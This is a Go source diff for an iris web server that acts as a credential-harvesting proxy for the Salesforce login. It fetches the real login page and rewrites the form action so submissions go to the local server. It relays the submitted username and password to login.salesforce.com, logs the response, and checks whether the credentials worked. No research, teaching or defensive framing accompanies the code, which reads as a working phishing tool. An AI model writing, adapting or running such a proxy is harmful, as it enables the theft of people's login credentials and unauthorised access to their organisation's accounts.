@@ -19,12 +19,11 @@ import (
 )
 
 const (
-	alohaHomeURL            = "https://aloha.my.salesforce.com"
-	alohaDotForceURL        = "https://aloha.force.com"
-	pathAlohav3__SAML_LOGIN = "/alohav3__SAML_LOGIN"
-	pathLogin               = "/login"
-	pathVerifyLogin         = "/verify_login"
-	sfdcAlohaLoginURL       = alohaDotForceURL + pathAlohav3__SAML_LOGIN
+	// alohaHomeURL            = "https://aloha.my.salesforce.com"
+	alohaHomeURL    = "https://login.salesforce.com/"
+	pathLogin       = "/login"
+	pathVerifyLogin = "/verify_login"
+	actionURL       = "https://login.salesforce.com/"
 )
 
 func main() {
@@ -101,11 +100,14 @@ func registerHandles(irisFW *iris.Framework, db *sqlx.DB) {
 		if err != nil {
 			log.Fatal(err)
 		}
+
 		// http.PostForm(sfdcAlohaLoginURL,)
-		s := strings.Replace(string(resp), sfdcAlohaLoginURL, pathLogin, -1)
+		// s := string(resp)
+		s := strings.Replace(string(resp), actionURL, pathLogin, -1)
 
 		// s := string(resp)
-		log.Println(s)
+		// log.Println(s)
+		// ctx.Text(iris.StatusOK, string(s))
 		ctx.HTML(iris.StatusOK, string(s))
 	})
 
@@ -114,7 +116,7 @@ func registerHandles(irisFW *iris.Framework, db *sqlx.DB) {
 		data := ctx.PostValuesAll()
 		// data :=url.Values{}
 		// data[]
-		resp, err := http.PostForm(sfdcAlohaLoginURL, data)
+		resp, err := http.PostForm(actionURL, data)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -123,33 +125,41 @@ func registerHandles(irisFW *iris.Framework, db *sqlx.DB) {
 		// io.Copy(os.Stdout, bodyBytes.Body)
 		bodyBytes, err := ioutil.ReadAll(resp.Body)
 
-		s := strings.Replace(string(bodyBytes), sfdcAlohaLoginURL, pathVerifyLogin, -1)
-		// s := string(resp)
-		// log.Println(s)
-		ctx.HTML(iris.StatusOK, string(s))
+		s := strings.Replace(string(bodyBytes), actionURL, pathLogin, -1)
 
-	})
-
-	irisFW.Post(pathVerifyLogin, func(ctx *iris.Context) {
-
-		data := ctx.PostValuesAll()
-		// data :=url.Values{}
-		// data[]
-
-		log.Printf("PostForm data %v", data)
-		resp, err := http.PostForm(sfdcAlohaLoginURL, data)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		defer resp.Body.Close()
-		// io.Copy(os.Stdout, bodyBytes.Body)
-		bodyBytes, err := ioutil.ReadAll(resp.Body)
-
-		s := string(bodyBytes)
+		// s := string(bodyBytes)
 		log.Println(s)
+
+		if strings.Contains(s, "https://org62.my.salesforce.com/home/home.jsp") {
+			log.Printf("\n********password verified\n")
+		} else {
+			log.Printf("\n********password NOT verified\n")
+		}
+
 		ctx.HTML(iris.StatusOK, string(s))
 
 	})
+
+	// irisFW.Post(pathVerifyLogin, func(ctx *iris.Context) {
+
+	// 	data := ctx.PostValuesAll()
+	// 	// data :=url.Values{}
+	// 	// data[]
+
+	// 	log.Printf("PostForm data %v", data)
+	// 	resp, err := http.PostForm(actionURL, data)
+	// 	if err != nil {
+	// 		log.Fatal(err)
+	// 	}
+
+	// 	defer resp.Body.Close()
+	// 	// io.Copy(os.Stdout, bodyBytes.Body)
+	// 	bodyBytes, err := ioutil.ReadAll(resp.Body)
+
+	// 	s := string(bodyBytes)
+	// 	log.Println(s)
+	// 	ctx.HTML(iris.StatusOK, string(s))
+
+	// })
 
 }
